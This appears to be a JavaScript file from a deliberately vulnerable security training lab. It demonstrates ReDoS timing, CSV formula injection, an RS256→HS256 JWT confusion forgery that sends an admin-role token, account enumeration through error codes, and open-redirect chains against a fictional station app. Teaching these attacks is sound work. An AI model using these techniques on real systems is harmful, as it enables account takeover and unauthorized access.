// LawCypenLab v22 :: ReDoS, CSV injection, JWT RS256→HS256 confusion, brute-force, redirect

// ── ReDoS Tester ─────────────────────────────────────────────────────
async function testRedos(pattern, haystack) {
  const timerEl = document.getElementById('redos-timer');
  const fillEl  = document.getElementById('redos-fill');
  const outEl   = document.getElementById('redos-out');
  if (timerEl) { timerEl.textContent = '…'; }
  if (fillEl)  { fillEl.style.width = '0'; }
  const t0 = performance.now();
  try {
    const r = await fetch('/data-export/search?' + new URLSearchParams({pattern, haystack}));
    const d = await r.json();
    const ms = Math.round(performance.now() - t0);
    if (timerEl) timerEl.textContent = ms + ' ms';
    const pct = Math.min(100, ms / 50);
    if (fillEl) { fillEl.style.background = ms > 2000 ? 'var(--danger)' : ms > 500 ? 'var(--amber)' : 'var(--cyan)'; fillEl.style.width = pct + '%'; }
    if (outEl) { outEl.style.display = 'block'; outEl.textContent = `HTTP ${r.status}  server_ms=${d.ms}\n\n${JSON.stringify(d,null,2)}`; }
  } catch (e) {
    if (timerEl) timerEl.textContent = 'ERROR';
    if (outEl) { outEl.style.display='block'; outEl.textContent = 'Error: '+e.message; }
  }
}

// ── CSV Injection Preview ────────────────────────────────────────────
function previewCsvInject() {
  const name = document.getElementById('csv-name')?.value || 'Normal User';
  const out  = document.getElementById('csv-preview');
  if (!out) return;
  const rows = [
    ['ID','Username','Clearance','Salary','Notes'],
    ['1','admin','ALPHA','18000','Commander'],
    ['2','r.solis','BETA','12000','Flight ops'],
    ['3','k.mbeki','GAMMA','8500','EVA eng'],
    ['6','guest','DELTA','0', name],
  ];
  out.innerHTML = '';
  const table = document.createElement('table');
  table.style.cssText = 'width:100%;border-collapse:collapse;font-size:11px;font-family:var(--mono,monospace)';
  rows.forEach((row, ri) => {
    const tr = document.createElement('tr');
    row.forEach((cell, ci) => {
      const td = document.createElement(ri===0?'th':'td');
      td.textContent = cell;
      td.style.cssText = 'padding:5px 8px;border:1px solid #232B3D;' + (ri===0?'background:#121826;color:#7C8699;font-size:10px;':'');
      if (ri > 0 && ci === row.length-1 && (cell.startsWith('=') || cell.startsWith('+') || cell.startsWith('-') || cell.startsWith('@'))) {
        td.style.color = '#FF5C5C';
        td.title = 'Formula injection — executes in Excel/LibreOffice';
      }
      tr.appendChild(td);
    });
    table.appendChild(tr);
  });
  out.appendChild(table);
}

// ── JWT RS256→HS256 Confusion ────────────────────────────────────────
function b64url(obj) {
  return btoa(JSON.stringify(obj)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
}
async function fetchPublicKey() {
  const r = await fetch('/api/v6/public-key');
  return (await r.text()).trim();
}
async function forgeJwtConfusion() {
  const out = document.getElementById('jwt-conf-out');
  if (out) { out.style.display='block'; out.textContent='Fetching public key…'; }
  const pubKey = await fetchPublicKey();
  const header  = b64url({alg:'HS256', typ:'JWT'});
  const payload = b64url({username:'attacker', role:'admin', iat: Math.floor(Date.now()/1000)});
  // In a real attack, the attacker would HMAC-sign using the RSA public key as the HMAC secret.
  // Here we demonstrate the forged structure and send it to the server.
  const forged = `${header}.${payload}.FORGED_HMAC_USING_PUBLIC_KEY_AS_SECRET`;
  const r = await fetch('/api/v6/admin', {headers:{Authorization:'Bearer '+forged}});
  const d = await r.json();
  if (out) {
    out.textContent = `=== Attack: RS256→HS256 Confusion ===\n\nForged Token:\n  header:  ${header}\n  payload: ${payload}\n  sig:     HMAC-SHA256( "${pubKey.slice(0,40)}..." )\n\nServer Response (HTTP ${r.status}):\n${JSON.stringify(d,null,2)}`;
  }
}

// ── Account Enumeration via Error Messages ────────────────────────────
async function runEnumeration() {
  const users = ['admin','commander','r.solis','k.mbeki','nobody_xyz','ghost_user','j.vance','guest'];
  const tbody  = document.getElementById('enum-tbody');
  const result = document.getElementById('enum-result');
  if (!tbody) return;
  tbody.innerHTML = '';
  if (result) { result.style.display='block'; }
  for (const u of users) {
    const t0 = performance.now();
    const r = await fetch('/biometrics/verify', {
      method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:`username=${encodeURIComponent(u)}&biometric=WRONG`
    });
    const ms = Math.round(performance.now()-t0);
    const d  = await r.json();
    const exists = r.status !== 404;
    const tr = document.createElement('tr');
    tr.className = exists ? 'hit' : 'miss';
    tr.innerHTML = `<td>${u}</td><td>${r.status}</td><td style="color:${exists?'#FF5C5C':'#4FD8E0'}">${exists?'EXISTS':'NOT FOUND'}</td><td>${d.error||''}</td><td>${ms} ms</td>`;
    tbody.appendChild(tr);
    await new Promise(res => setTimeout(res, 80));
  }
}

// ── Redirect Chain Visualizer ─────────────────────────────────────────
function buildRedirectChain(target) {
  const container = document.getElementById('redirect-chain');
  if (!container) return;
  const hops = [
    {url: `https://aegis-station.local/auth/redirect?next=${encodeURIComponent(target)}`, status:'302', cls:'vuln'},
    {url: target.startsWith('//')  ? `https:${target}` : target.startsWith('http') ? target : `https://aegis-station.local${target}`, status:'200', cls: target.startsWith('//') || target.startsWith('http') ? 'evil' : 'safe'},
  ];
  container.innerHTML = hops.map(h => `
    <div class="redirect-hop ${h.cls}">
      <span class="hop-status ${h.status==='302'?'hop-302':h.cls==='evil'?'hop-evil':'hop-200'}">${h.status}</span>
      <span class="hop-url">${h.url}</span>
      ${h.cls==='evil' ? '<span style="color:var(--danger);font-size:10px;">⚠ EXTERNAL</span>' : ''}
    </div>`).join('<div style="padding:2px 8px;color:var(--dim);font-size:10px;">↓</div>');
}
